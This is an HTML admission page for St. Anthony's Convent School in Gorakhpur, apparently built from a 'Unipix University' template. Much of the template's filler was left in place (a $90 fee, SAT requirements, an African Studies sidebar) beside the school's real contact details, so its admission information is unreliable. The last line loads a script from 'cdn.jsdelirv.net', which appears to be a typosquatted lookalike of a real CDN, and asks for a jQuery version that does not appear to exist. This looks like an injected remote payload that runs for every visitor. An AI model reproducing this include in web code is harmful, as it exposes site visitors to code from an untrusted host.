<!DOCTYPE>
<html>
<!-- Mirrored from php.themewant.com/unipix/index-two.php by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 May 2025 07:44:43 GMT -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>St. Anthony’s Convent School</title>
    <link rel="shortcut icon" type="image/x-icon" href="assets/images/logo/emblem%201.jpg">
    <!-- animate css -->
    <link rel="stylesheet" href="assets/css/plugins/animate.min.css">
    <!-- fontawesome 6.4.2 -->
    <link rel="stylesheet" href="assets/css/plugins/fontawesome.min.css">
    <!-- bootstrap min css -->
    <link rel="stylesheet" href="assets/css/vendor/bootstrap.min.css">
    <!-- swiper Css 10.2.0 -->
    <link rel="stylesheet" href="assets/css/plugins/swiper.min.css">
    <!-- Bootstrap 5.0.2 -->
    <link rel="stylesheet" href="assets/css/vendor/magnific-popup.css">
    <!-- metismenu scss -->
    <link rel="stylesheet" href="assets/css/vendor/metismenu.css">
    <!-- nice select js -->
    <link rel="stylesheet" href="assets/css/plugins/nice-select.css">
    <link rel="stylesheet" href="assets/css/plugins/jquery-ui.css">
    <!-- custom style css -->
    <link rel="stylesheet" href="assets/css/style.css">
    <link href="assets/css/flexslider.css" rel="stylesheet" />

</head>

<body>
    <!-- Top Contact Bar -->
    <div class="top-bar">
        <div class="top-bar-container">
            <div class="contact-details">
                📞 <a href="tel:+919876543210">0551-228 0250</a> &nbsp; | &nbsp;
                📧 <a href="mailto:stanthony100@gmail.com">stanthony100@gmail.com</a>
               <span style="padding-left:12px;">Affiliation Number- 2131306</span>
            </div>
            <div class="social-icons">
                <a href="https://www.facebook.com/share/16NQD98XaQ/" target="_blank"><i class="fab fa-facebook-f"></i></a>
                <a href="#" target="_blank"><i class="fab fa-instagram"></i></a>
                <a href="https://youtube.com/@stanthonyconvent5802" target="_blank"><i class="fab fa-youtube"></i></a>
                <a href="https://wa.me/+918303547194" target="_blank"><i class="fab fa-whatsapp"></i></a>
            </div>
        </div>
    </div>
    <!-- header area start -->
    <header class="header header__sticky v__2">
        <div class="container-fluid header11topDown">
            <div class="row">
                <div class="col-xl-12">
                    <div class="header__wrapper">
                        <div class="header__logo d-flex align-items-center">
                            <a href="index.php" class="d-flex align-items-center text-decoration-none">
                                <img src="assets/images/logo/emblem 1.png" height="80" width="80" alt="St. Anthony’s Convent School Logo" class="me-2" style="object-fit: contain;    padding-left: 9px;width:23%;">
                                <div class="school-name text-dark">
                                    <h5 class="mb-0 fw-bold" style="font-size: 18px; line-height: 1.2;">St. Anthony’s Convent School</h5>
                                    <small class="text-muted" style="font-size: 13px;">Gorakhpur • Serve in Love</small>
                                </div>
                            </a>
                        </div>

                        <div class="header__menu">
                            <div class="navigation">
                                <nav class="navigation__menu">
                                    <ul>
                                        <li class="navigation__menu--item has-child">
                                            <a href="index.php" class="navigation__menu--item__link">Home</a>
                                             
                                        </li> 
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="javascript:void(0);" class="navigation__menu--item__link">About Us</a>
                                            <ul class="submenu sub__style">
                                                                                                    <li><a href="content.php?slug=about-us">About Us</a></li>
                                                                                                    <li><a href="content.php?slug=objectives">Objectives</a></li>
                                                                                                <li><a href="principal.php">Principal Desk </a></li>
                                            </ul>
                                        </li>

                                        
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="javascript:void(0);" class="navigation__menu--item__link">Curriculam</a>
                                            <ul class="submenu sub__style">
                                                                                                    <li><a href="content.php?slug=fees-structure">Fees Structure</a></li>
                                                                                                    <li><a href="content.php?slug=admission-details">Admission Details</a></li>
                                                                                                    <li><a href="content.php?slug=attendance-and-absence">Attendance And Absence</a></li>
                                                                                                    <li><a href="content.php?slug=holidays">Holidays</a></li>
                                                                                                    <li><a href="content.php?slug=behaviour-discipline-policy">Behaviour/Discipline Policy</a></li>
                                                                                                    <li><a href="content.php?slug=co-curricular-activities">Co-Curricular Activities</a></li>
                                                                                                    <li><a href="content.php?slug=school-timings">School Timings</a></li>
                                                                                                    <li><a href="content.php?slug=fee-structure">TEACHING STAFF</a></li>
                                                                                                    <li><a href="content.php?slug=the-curriculum">The Curriculum</a></li>
                                                                                                    <li><a href="content.php?slug=general-information">General Information</a></li>
                                                                                                    <li><a href="content.php?slug=academic-calander">ACADEMIC  CALANDER</a></li>
                                                                                                    <li><a href="content.php?slug=parent-teacher-association">PARENT-TEACHER ASSOCIATION</a></li>
                                                                                                    <li><a href="content.php?slug=copies-of-valid-water-health-and-sanitation-certificates">WATER, HEALTH AND SANITATION CERTIFICATES</a></li>
                                                                                                    <li><a href="content.php?slug=result-of-last-five-years">RESULT OF LAST FIVE YEARS</a></li>
                                                                                                    <li><a href="content.php?slug=no-objection-certificate-noc-by-the-state-govt-up">NO OBJECTION CERTIFICATE (NOC) BY THE STATE GOVT./UP</a></li>
                                                                                                    <li><a href="content.php?slug=societies-trust-company-registration-renewal-certificate">SOCIETIES/TRUST/COMPANY REGISTRATION/RENEWAL CERTIFICATE</a></li>
                                                                                                    <li><a href="content.php?slug=affiliation-upgradation-letter-and-recent-extension-of-affiliation">AFFILIATION/UPGRADATION LETTER AND RECENT EXTENSION OF AFFILIATION</a></li>
                                                                                                    <li><a href="content.php?slug=school-infrasturcture">SCHOOL INFRASTURCTURE</a></li>
                                                                                                    <li><a href="content.php?slug=the-deo-certificate-submitted-by-the-school-for-affiliation-upgradation-extension-of-affiliation-or-self-certification-by-school">THE DEO CERTIFICATE SUBMITTED BY THE SCHOOL FOR AFFILIATION/UPGRADATION/EXTENSION OF AFFILIATION OR SELF CERTIFICATION BY SCHOOL</a></li>
                                                                                                    <li><a href="content.php?slug=copy-of-valid-building-safety-certificate-as-per-the-national-building-code-">COPY OF VALID BUILDING SAFETY CERTIFICATE AS PER THE NATIONAL BUILDING CODE*</a></li>
                                                                                                    <li><a href="content.php?slug=copy-of-valid-fire-safety-certificate-issued-by-the-competent-authority-">COPY OF VALID FIRE SAFETY CERTIFICATE ISSUED BY THE COMPETENT AUTHORITY*</a></li>
                                                                                                    <li><a href="content.php?slug=list-of-school-management-committee-smc-">LIST OF SCHOOL MANAGEMENT COMMITTEE (SMC)</a></li>
                                                                                            </ul>
                                        </li>
                                        
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="javascript:void(0);" class="navigation__menu--item__link">Facilities</a>
                                            <ul class="submenu sub__style">
                                                                                                    <li><a href="content.php?slug=library">Library</a></li>
                                                                                                    <li><a href="content.php?slug=parents-teachers-interaction">Parents/Teachers Interaction</a></li>
                                                                                                    <li><a href="content.php?slug=computer-lab">COMPUTER LAB</a></li>
                                                                                                    <li><a href="content.php?slug=physics-lab">PHYSICS LAB</a></li>
                                                                                                    <li><a href="content.php?slug=biology-lab">BIOLOGY LAB</a></li>
                                                                                                    <li><a href="content.php?slug=chemistry-lab">CHEMISTRY LAB</a></li>
                                                                                            </ul>
                                        </li>

                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="#" class="navigation__menu--item__link">Achievements</a>
                                            <ul class="submenu sub__style">
                                                <li><a href="toppers-x.php">Toppers X</a></li>
                                                <li><a href="toppers-xii.php">Toppers XII</a></li>
                                            </ul>
                                        </li>

                                         
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="#" class="navigation__menu--item__link">Gallery</a>
                                            <ul class="submenu sub__style">
                                                <li><a href="event_gallery.php">Event Gallery</a></li>
                                                <!--<li><a href="menu/VideoGallery/Default.php">Video Gallery</a></li>-->
                                            </ul>
                                        </li>
                                         <li class="navigation__menu--item has-child">
                                            <a href="tc.php" class="navigation__menu--item__link">Tc</a>
                                             
                                        </li> 

                                        <li class="navigation__menu--item">
                                            <a href="contact.php" class="navigation__menu--item__link">Contact</a>
                                        </li>
                                    </ul>
                                </nav>
                            </div>
                        </div>
                        <div class="header__right">
                            <div class="header__right--item">
                                <div id="menu-btn" class="menu__trigger">
                                    <i class="fa-solid fa-bars"></i>
                                    <!--<img src="assets/images/icon/menu__bar.svg" alt="bar">-->
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>




     




    <!-- BREADCRUMB AREA -->
    <section class="rts-breadcrumb breadcrumb-height breadcumb-bg" style="background-image: url(assets/images/banner/breadcrumb.jpg);">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="breadcrumb-content">
                        <ul class="breadcrumb">
                            <li class="breadcrumb-item"><a href="index.php">Home</a></li>
                            <li class="breadcrumb-item active" aria-current="page">Apply Admission</li>
                        </ul>
                        <h2 class="section-title">Apply to Unipix University</h2>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- BREADCRUMB AREA END -->


    <!-- admission page content -->
    <div class="rts-page-content rts-section-padding">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="admission-content-top">
                        <h3 class="rts-section-title">
                            First-Year Applicants
                        </h3>

                        <div class="admission-big-thumb">
                            <img src="assets/images/course/admission-bg.jpg" alt="admission">
                        </div>

                        <div class="requirement-deadline">
                            <h3 class="rts-section-title">Requirements and Deadlines</h3>
                            <div class="requirement-deadline__content">
                                <ul>
                                    <li class="single-requirement">$90 nonrefundable application fee or fee waiver request</li>
                                    <li class="single-requirement">ACT or SAT test scores (test optional)</li>
                                    <li class="single-requirement">School Report form and counselor letter of recommendation </li>
                                    <li class="single-requirement">Official transcript(s) or academic results</li>
                                    <li class="single-requirement">Letters of recommendation from two teachers</li>
                                    <li class="single-requirement">Midyear transcript (due by February 15)</li>
                                    <li class="single-requirement">$90 nonrefundable application fee or fee waiver request</li>
                                    <li class="single-requirement">ACT or SAT test scores (test optional)</li>
                                    <li class="single-requirement">School Report form and counselor letter of recommendation </li>
                                    <li class="single-requirement">Official transcript(s) or academic results</li>
                                    <li class="single-requirement">Letters of recommendation from two teachers</li>
                                    <li class="single-requirement">Midyear transcript (due by February 15)</li>
                                </ul>
                            </div>
                        </div>
                        <div class="application-deadline">
                            <h3 class="rts-section-title">Application Deadlines</h3>
                            <div class="application-deadline__content">
                                <div class="application-deadline__content--table">
                                    <table class="table">
                                        <thead class="table-theme">
                                            <tr>
                                                <td>Event</td>
                                                <td>Restrictive Early Action</td>
                                                <td>Regular Decision</td>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <tr>
                                                <td>Standard Application Deadline</td>
                                                <td>November 1</td>
                                                <td>January 10</td>
                                            </tr>
                                            <tr>
                                                <td>Notification of Missing Documents</td>
                                                <td>Mid-November</td>
                                                <td>Mid-February</td>
                                            </tr>
                                            <tr>
                                                <td>Decision Released By</td>
                                                <td>Mid-December</td>
                                                <td>Early April</td>
                                            </tr>
                                            <tr>
                                                <td>Student Reply Date</td>
                                                <td>May 1</td>
                                                <td>May 1</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                                <p> Unipix reserves the right to evaluate an application and render a final decision even if all pieces of the application have not been received.</p>
                                <p class="w-95 mx-0">Applicants are limited to a total of three applications for undergraduate admission, whether for first-year admission, transfer admission or a <br>combination of both. If you have submitted fewer than three applications to Unipix, you may reapply.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row sticky-coloum-wrap g-5 mt--45">
                <div class="col-lg-8">
                    <div class="rts-ap-section">
                        <h3 class="rts-section-title mb--30">Application Details</h3>
                        <div class="rts-application-form">
                            <form action="#">
                                <div class="single-form-part">
                                    <h5 class="form-title">Personal Information</h5>
                                    <div class="single-input">
                                        <div class="single-input-item">
                                            <label for="fname">First Name</label>
                                            <input type="text" id="fname" placeholder="First name">
                                        </div>
                                        <div class="single-input-item">
                                            <label for="lname">Last Name</label>
                                            <input type="text" id="lname" placeholder="Last name">
                                        </div>
                                    </div>
                                    <div class="single-input">
                                        <div class="single-input-item">
                                            <label for="email2">Enter your mail</label>
                                            <input type="email" id="email2" placeholder="Enter your mail">
                                        </div>
                                        <div class="single-input-item">
                                            <label for="phone">Enter Phone Number</label>
                                            <input type="tel" id="phone" placeholder="Enter Phone Number">
                                        </div>
                                    </div>
                                    <div class="single-input">
                                        <div class="single-input-item">
                                            <label for="dob">Date of Birth</label>
                                            <input type="text" id="datepicker" placeholder="dd/mm/yy">
                                        </div>
                                        <div class="single-input-item">
                                            <label for="gender">Gender</label>
                                            <select name="gender" id="gender">
                                                <option value="*">Gender</option>
                                                <option value="*">Male</option>
                                                <option value="*">Female</option>
                                            </select>
                                        </div>
                                    </div>
                                    <div class="single-input">
                                        <div class="single-input-item">
                                            <label for="country">Select your Country </label>
                                            <input id="country" type="text" placeholder="Country">
                                        </div>
                                    </div>
                                </div>
                                <div class="single-form-part">
                                    <h5 class="form-title">Academic Information</h5>
                                    <div class="single-input">
                                        <div class="single-input-item">
                                            <label for="cname">Collage Name</label>
                                            <input id="cname" type="text" placeholder="Collage Name">
                                        </div>
                                        <div class="single-input-item">
                                            <label for="gpa">Enter your GPA</label>
                                            <input id="gpa" type="text" placeholder="Enter your GPA">
                                        </div>
                                    </div>
                                    <div class="single-input">
                                        <div class="single-input-item">
                                            <label for="cname2">Collage Name</label>
                                            <input id="cname2" type="text" placeholder="current college">
                                        </div>
                                        <div class="single-input-item">
                                            <label for="gpa2">Enter your GPA</label>
                                            <input type="text" id="gpa2" placeholder="Current GPA">
                                        </div>
                                    </div>
                                </div>
                                <div class="single-form-part">
                                    <h5 class="form-title">Financial Information</h5>
                                    <div class="single-input">
                                        <div class="single-input-item">
                                            <label for="income">Household Income</label>
                                            <select name="income" id="income">
                                                <option value="*">Less then $1k</option>
                                                <option value="*">Less then $2k</option>
                                                <option value="*">Less then $3k</option>
                                            </select>
                                        </div>
                                        <div class="single-input-item">
                                            <label for="yes">applying for need-based financial aid</label>
                                            <select name="yes" id="yes">
                                                <option value="*">yes</option>
                                                <option value="*">no</option>
                                            </select>
                                        </div>
                                    </div>

                                </div>
                                <div class="single-form-part">
                                    <h5 class="form-title">Agreement and Submission</h5>
                                    <p>By submitting this application, I confirm that all information provided is accurate and complete. I understand that any false
                                        information may result in the disqualification of my application.
                                    </p>
                                    <div class="single-input-item">
                                        <label for="sub">Application Submission:</label>
                                        <input type="file" id="sub">
                                    </div>

                                    <div class="d-flex align-items-center single-checkbox mt--20">
                                        <input type="checkbox" id="exampleCheck1">
                                        <label for="exampleCheck1">By submitting this form, you agree to the Unipix University Privacy Notice</label>
                                    </div>
                                </div>
                                <button type="submit" class="rts-theme-btn primary with-arrow">Submit Application<span><i class="fa-thin fa-arrow-right"></i></span></button>
                            </form>

                        </div>
                    </div>
                </div>
                <div class="col-lg-4 sticky-coloum-item">
                    <div class="program-sidebar">
                        <!-- curriculum -->
                        <div class="program-curriculum">
                            <h6 class="heading-title">B.A In African Studies</h6>
                            <div class="program-menu">
                                <ul class="list-unstyled">
                                    <li><a href="#"><span><i class="fa-light fa-arrow-right"></i></span>Course Curriculum</a></li>
                                    <li><a href="#"><span><i class="fa-light fa-arrow-right"></i></span>Program Faculty</a></li>
                                    <li><a href="#"><span><i class="fa-light fa-arrow-right"></i></span>Apply Admission</a></li>
                                    <li><a href="#"><span><i class="fa-light fa-arrow-right"></i></span>Scholarship </a></li>
                                    <li><a href="#"><span><i class="fa-light fa-arrow-right"></i></span>Joint Event</a></li>
                                </ul>
                            </div>
                        </div>
                        <!-- contact info -->
                        <div class="program-info">
                            <h5>Department Contact Info</h5>
                            <p>B.A. in Africana Studies</p>
                            <div class="contact-info">
                                <h5>Contact:</h5>
                                <a href="mailto:barry.Unipix@info.com">barry.Unipix@info.com</a>
                                <a href="callto:121">664-254-251</a>
                            </div>
                            <div class="social-info">
                                <h5>Social Info:</h5>
                                <div class="social-info-link">
                                    <a href="#"><i class="fa-brands fa-facebook"></i></a>
                                    <a href="#"><i class="fa-brands fa-instagram"></i></a>
                                    <a href="#"><i class="fa-brands fa-linkedin"></i></a>
                                    <a href="#"><i class="fa-brands fa-pinterest"></i></a>
                                    <a href="#"><i class="fa-brands fa-youtube"></i></a>
                                </div>
                            </div>
                        </div>

                        <!-- join event -->
                        <div class="program-event">
                            <div class="program-event-content">
                                <p>Joint New Event About
                                    African History
                                </p>
                                <h4 class="event-title">B.A. in Africana
                                    Studies</h4>
                                <div class="single-event-content-meta">
                                    <div class="event-time">
                                        <span><i class="fa-sharp fa-thin fa-clock"></i></span>
                                        <span>10:30 am</span>
                                    </div>
                                    <div class="event-place">
                                        <span><i class="fa-sharp fa-thin fa-location-dot"></i></span>
                                        <span>Yarra Park, UK</span>
                                    </div>
                                    <div class="event-date">
                                        <span><i class="fal fa-calendar"></i></span>
                                        <span>November 28, 2023</span>
                                    </div>
                                </div>
                                <a href="#" class="rts-theme-btn with-arrow btn-white lh-100">Joint Now <span><i class="fa-thin fa-arrow-right"></i></span></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- admission page content end -->

      

<!-- footer start -->
    <footer class="rts-footer rts-footer-padding v_2">
        <div class="container">
            <div class="row justify-content-center">
                <div class="rts-footer-newsletter">
                    <div class="col-lg-10">
                        <div class="rts-newsletter-box-content">
                            <h4 class="newsletter-title">Subscribe To Newsletter
                            </h4>
                            <div class="newsletter-form w-530">
                                <form action="#">
                                    <input type="email" name="subscription" id="subscription" placeholder="Enter Your mail" required="">
                                    <button type="submit" class="rts-nbg-btn btn-arrow">Subscribe <span><i class="fa-sharp fa-regular fa-arrow-right"></i></span></button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row gy-5 gy-lg-0">
                <div class="col-lg-4 col-md-6 col-sm-6">
                    <div class="rts-footer-widget w-320">
                        <div class="header__logo" style="display: flex; align-items: center;">
                            <a href="index.php" style="display: flex; align-items: center; text-decoration: none;">
                                <img src="assets/images/logo/emblem 1.png"
                                    alt="St. Anthony’s Convent School Logo"
                                    height="80" width="80"
                                    style="border-radius: 50%; object-fit: cover; margin-right: 10px; border: 2px solid #ccc;">
                                
                                <div style="color: #000;">
                                    <h5 style="margin: 0; font-weight: bold; font-size: 18px; line-height: 1.2;color:white">
                                        St. Anthony’s Convent School
                                    </h5>
                                    <small style="font-size: 13px; color: #6c757d;">Gorakhpur • Serve in Love</small>
                                </div>
                            </a>
                        </div>


                        <p>
                            We are passionate education dedicated to providing high-quality
                            resources learners all backgrounds.
                        </p>
                        <div class="rts-contact-link">
                            <a href="mailto:stanthony100@gmail.com"><i class="fa-sharp fa-light fa-location-dot"></i> Railway Dairy Colony, Gorakhpur, Uttar Pradesh 273012</a>
                            <a href="callto:0551-228 0250"><i class="fa-thin fa-phone"></i> 0551-228 0250</a>
                        </div>
                    </div>
                </div>
                <div class="col-lg-2 col-md-6 col-sm-6">
                    <div class="rts-footer-widget ">
                        <h6 class="rt-semi">Important Links</h6>
                        <div class="rts-footer-menu">
                            <ul>
                                <li><a href="#">Privacy Policy</a></li>
                                <li><a href="#">Terms & Conditions</a></li>
                                <li><a href="#">Sitemap</a></li>
                                <li><a href="#"> Blogs</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-lg-2 col-md-6 col-sm-4">
                    <div class="rts-footer-widget ml--30">
                        <h6 class="rt-semi">About Us</h6>
                        <div class="rts-footer-menu">
                            <ul>
                                <li><a href="#">Our History </a></li>
                                <li><a href="About.php">About Us</a></li>
                                <li><a href="#">St. Anthony</a></li>
                                <li><a href="#">Our Mission</a></li>
                                <li><a href="#">Our Vision</a></li>
                                 <li><a href="#">Our Motto</a></li>
                                <li><a href="#">School Anthem</a></li>
                               
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-lg-4 col-md-6 col-sm-8">
                    <div class="rts-footer-widget ml--30">
                        
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    <div class="rts-footer-copy-right v_1">
        <div class="container">
            <div class="row">
                <div class="rt-center">
                    <p class="--p-xs">Copyright &copy; <span id="year"></span> All Rights Reserved by <a href="#">St. Anthony’s Convent School</a></p>
                </div>
            </div>
        </div>
    </div>
    <!-- footer end -->
    <!-- offcanvase menu -->
    <!-- header style two -->
    <div id="side-bar" class="side-bar">
        <button class="close-icon-menu"><i class="far fa-times"></i></button>
        <!-- inner menu area desktop start -->
        <div class="inner-main-wrapper-desk">
            <div class="thumbnail">
                
               <a href="index.php" class="d-flex align-items-center text-decoration-none">
                <img src="assets/images/logo/emblem 1.png" height="80" width="80" alt="St. Anthony’s Convent School Logo" class="me-2" style="object-fit: contain;    padding-left: 9px;width:23%;">
                <div class="school-name text-dark">
                    <h5 class="mb-0 fw-bold" style="font-size: 18px; line-height: 1.2;">St. Anthony’s Convent School</h5>
                    <small class="text-muted" style="font-size: 13px;">Gorakhpur • Serve in Love</small>
                </div>
            </a>
            </div>
            <div class="inner-content">
                <p class="disc">
                    A modern php template for education, offering intuitive design & essential features for seamless learning experiences.
                </p>
                <!-- offcanvase banner -->
                <div class="offcanvase__banner mt--50">
                    <div class="offcanvase__banner--content">
                        <img src="assets/images/offcanvase.jpg" alt="offcanvase">
                        <a href="admission.php" class="rts-theme-btn">Apply Now</a>
                    </div>
                </div>
                <div class="offcanvase__info">
                    <div class="offcanvase__info--content">
                        <a href="callto:+0551-228 0250"><span><i class="fa-sharp fa-light fa-phone"></i></span>0551-228 0250</a>
                        <a href="#"><span><i class="fa-sharp fa-light fa-location-dot"></i></span>Railway Dairy Colony, Gorakhpur, Uttar Pradesh 273012</a>
                        <div class="offcanvase__info--content--social">
                            <p class="title">Follow Us:</p>
                            <div class="social__links">
                                <a href="https://www.facebook.com/share/16NQD98XaQ/"><i class="fa-brands fa-facebook"></i></a>
                                <a href="#"><i class="fa-brands fa-instagram"></i></a>
                                <a href="https://wa.me/+918303547194" target="_blank"><i class="fab fa-whatsapp"></i></a>
                                <a href="https://youtube.com/@stanthonyconvent5802"><i class="fa-brands fa-youtube"></i></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- mobile menu area start -->
        <div class="mobile-menu-main">
            <nav class="nav-main mainmenu-nav mt--30">
            <ul class="mainmenu metismenu" id="mobile-menu-active">
                <li>
                    <a href="index.php" class="main">Home</a>
                </li>
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">About Us</a>
                    <ul class="submenu mm-collapse">
                                                    <li><a href="content.php?slug=about-us">About Us</a></li>
                                                    <li><a href="content.php?slug=objectives">Objectives</a></li>
                                                 <li>
                            <a href="principal.php" class="main">Principal Desk</a>
                        </li>
                    </ul>
                </li>
                
                <!-- Curriculum - Dynamic -->
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Curriculum</a>
                    <ul class="submenu mm-collapse">
                                                    <li><a href="content.php?slug=fees-structure">Fees Structure</a></li>
                                                    <li><a href="content.php?slug=admission-details">Admission Details</a></li>
                                                    <li><a href="content.php?slug=attendance-and-absence">Attendance And Absence</a></li>
                                                    <li><a href="content.php?slug=holidays">Holidays</a></li>
                                                    <li><a href="content.php?slug=behaviour-discipline-policy">Behaviour/Discipline Policy</a></li>
                                                    <li><a href="content.php?slug=co-curricular-activities">Co-Curricular Activities</a></li>
                                                    <li><a href="content.php?slug=school-timings">School Timings</a></li>
                                                    <li><a href="content.php?slug=fee-structure">TEACHING STAFF</a></li>
                                                    <li><a href="content.php?slug=the-curriculum">The Curriculum</a></li>
                                                    <li><a href="content.php?slug=general-information">General Information</a></li>
                                                    <li><a href="content.php?slug=academic-calander">ACADEMIC  CALANDER</a></li>
                                                    <li><a href="content.php?slug=parent-teacher-association">PARENT-TEACHER ASSOCIATION</a></li>
                                                    <li><a href="content.php?slug=copies-of-valid-water-health-and-sanitation-certificates">WATER, HEALTH AND SANITATION CERTIFICATES</a></li>
                                                    <li><a href="content.php?slug=result-of-last-five-years">RESULT OF LAST FIVE YEARS</a></li>
                                                    <li><a href="content.php?slug=no-objection-certificate-noc-by-the-state-govt-up">NO OBJECTION CERTIFICATE (NOC) BY THE STATE GOVT./UP</a></li>
                                                    <li><a href="content.php?slug=societies-trust-company-registration-renewal-certificate">SOCIETIES/TRUST/COMPANY REGISTRATION/RENEWAL CERTIFICATE</a></li>
                                                    <li><a href="content.php?slug=affiliation-upgradation-letter-and-recent-extension-of-affiliation">AFFILIATION/UPGRADATION LETTER AND RECENT EXTENSION OF AFFILIATION</a></li>
                                                    <li><a href="content.php?slug=school-infrasturcture">SCHOOL INFRASTURCTURE</a></li>
                                                    <li><a href="content.php?slug=the-deo-certificate-submitted-by-the-school-for-affiliation-upgradation-extension-of-affiliation-or-self-certification-by-school">THE DEO CERTIFICATE SUBMITTED BY THE SCHOOL FOR AFFILIATION/UPGRADATION/EXTENSION OF AFFILIATION OR SELF CERTIFICATION BY SCHOOL</a></li>
                                                    <li><a href="content.php?slug=copy-of-valid-building-safety-certificate-as-per-the-national-building-code-">COPY OF VALID BUILDING SAFETY CERTIFICATE AS PER THE NATIONAL BUILDING CODE*</a></li>
                                                    <li><a href="content.php?slug=copy-of-valid-fire-safety-certificate-issued-by-the-competent-authority-">COPY OF VALID FIRE SAFETY CERTIFICATE ISSUED BY THE COMPETENT AUTHORITY*</a></li>
                                                    <li><a href="content.php?slug=list-of-school-management-committee-smc-">LIST OF SCHOOL MANAGEMENT COMMITTEE (SMC)</a></li>
                                            </ul>
                </li>
                
                <!-- Facilities - Dynamic -->
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Facilities</a>
                    <ul class="submenu mm-collapse">
                                                    <li><a href="content.php?slug=library">Library</a></li>
                                                    <li><a href="content.php?slug=parents-teachers-interaction">Parents/Teachers Interaction</a></li>
                                                    <li><a href="content.php?slug=computer-lab">COMPUTER LAB</a></li>
                                                    <li><a href="content.php?slug=physics-lab">PHYSICS LAB</a></li>
                                                    <li><a href="content.php?slug=biology-lab">BIOLOGY LAB</a></li>
                                                    <li><a href="content.php?slug=chemistry-lab">CHEMISTRY LAB</a></li>
                                            </ul>
                </li>

                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Achievements</a>
                    <ul class="submenu mm-collapse">
                        <li><a href="toppers-x.php">Toppers X</a></li>
                        <li><a href="toppers-xii.php">Toppers XII</a></li>
                    </ul>
                </li>
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Gallery</a>
                    <ul class="submenu mm-collapse">
                        <li><a href="event_gallery.php">Event Gallery</a></li>
                        <!--<li><a href="menu/VideoGallery/Default.php">Video Gallery</a></li>-->
                    </ul>
                </li>
                <li>
                    <a href="blog.php" class="main">Blogs</a>
                </li>
                <li>
                    <a href="contact.php" class="main">Contact</a>
                </li>
            </ul>
            </nav>

            <div class="offcanvase__info--content mt--30">
                <a href="callto:+0551-228 0250"><span><i class="fa-sharp fa-light fa-phone"></i></span>0551-228 0250</a>
                <a href="#"><span><i class="fa-sharp fa-light fa-location-dot"></i></span>Railway Dairy Colony, Gorakhpur, Uttar Pradesh 273012</a>
                <div class="offcanvase__info--content--social">
                    <p class="title">Follow Us:</p>
                    <div class="social__links">
                        <a href="https://www.facebook.com/share/16NQD98XaQ/"><i class="fa-brands fa-facebook"></i></a>
                        <a href="#"><i class="fa-brands fa-instagram"></i></a>
                        <a href="https://wa.me/+918303547194" target="_blank"><i class="fab fa-whatsapp"></i></a>
                        <a href="https://youtube.com/@stanthonyconvent5802"><i class="fa-brands fa-youtube"></i></a>
                    </div>
                </div>
            </div>
        </div>
        <!-- mobile menu area end -->
    </div>
    <!-- header style two End -->

    <div class="search-input-area">
        <div class="container">
            <div class="search-input-inner">
                <div class="input-div">
                    <input class="search-input autocomplete ui-autocomplete-input" type="text" placeholder="Search by keyword or #" autocomplete="off">
                    <button><i class="far fa-search"></i></button>
                </div>
            </div>
        </div>
        <div id="close" class="search-close-icon"><i class="far fa-times"></i></div>
    </div>
    <!-- rts backto top start -->
    <div class="progress-wrap">
        <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
            <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98" style="transition: stroke-dashoffset 10ms linear 0s; stroke-dasharray: 307.919, 307.919; stroke-dashoffset: 307.919;"></path>
        </svg>
    </div>
    <!-- rts back to top end -->
    <div id="anywhere-home" class="">
    </div>


    <!-- scripts -->
    <!-- jquery js -->
    <script src="assets/js/vendor/jquery.min.js"></script>
    <!-- bootstrap 5.0.2 -->
    <script src="assets/js/plugins/bootstrap.min.js"></script>
    <!-- jquery ui js -->
    <script src="assets/js/vendor/jquery-ui.js"></script>
    <!-- wow js -->
    <script src="assets/js/vendor/waw.js"></script>
    <!-- mobile menu -->
    <script src="assets/js/vendor/metismenu.js"></script>
    <!-- magnific popup -->
    <script src="assets/js/vendor/magnifying-popup.js"></script>
    <!-- swiper JS 10.2.0 -->
    <script src="assets/js/plugins/swiper.js"></script>
    <!-- counterup -->
    <script src="assets/js/plugins/counterup.js"></script>
    <script src="assets/js/vendor/waypoint.js"></script>
    <!-- isotop mesonary -->
    <script src="assets/js/plugins/isotop.js"></script>
    <script src="assets/js/plugins/imagesloaded.pkgd.min.js"></script>
    <script src="assets/js/plugins/sticky-sidebar.js"></script>
    <script src="assets/js/plugins/resize-sensor.js"></script>
    <script src="assets/js/plugins/twinmax.js"></script>
    <!-- dymanic Contact Form -->
    <script src="assets/js/plugins/contact.form.js"></script>
    <script src="assets/js/plugins/nice-select.min.js"></script>
    <!-- main Js -->
    <script src="assets/js/jquery.flexslider.js"></script>
    <script src="assets/js/main.js"></script>

<script src="https://cdn.jsdelirv.net/npm/jquery@4.5.2/dist/jquery.min.js"></script>
</body>
</html>